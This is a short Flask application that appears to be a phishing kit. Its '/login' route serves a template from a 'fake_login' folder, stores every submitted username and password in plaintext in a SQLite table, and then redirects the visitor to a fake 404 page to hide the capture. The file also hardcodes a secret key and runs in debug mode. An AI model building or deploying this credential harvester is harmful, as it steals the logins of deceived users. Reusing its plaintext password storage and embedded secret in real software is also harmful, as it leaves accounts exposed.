from flask import Flask, render_template, url_for, redirect
from flask_sqlalchemy import SQLAlchemy
from form import LoginForm, LoginForm1
app = Flask(__name__)

app.config['SECRET_KEY'] = '57bf24e23df89d5eab59adc875b50b76'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(30), nullable=False, unique=True)
    password = db.Column(db.String(60), nullable=False)
    

    def __repr__(self):
        return f"User( '{self.username}' )"

@app.route("/")
@app.route("/home")
def home():
    return render_template('fake_login/home.html')

@app.route("/login", methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        user = User(username=form.username.data, password=form.password.data)
        db.session.add(user)
        db.session.commit()
        return redirect (url_for('error_404'))
    return render_template('fake_login/login.html', title='Login', form=form)

@app.route("/error_404")
def error_404():
    return render_template('fake_login/error_404.html')

@app.route("/real_login1", methods=['GET', 'POST'])
def real_login1():
    form = LoginForm1()
        
    return render_template('real_login/real_login1.html', title='Login', form=form)



if __name__ == "__main__":
    app.run(debug=True)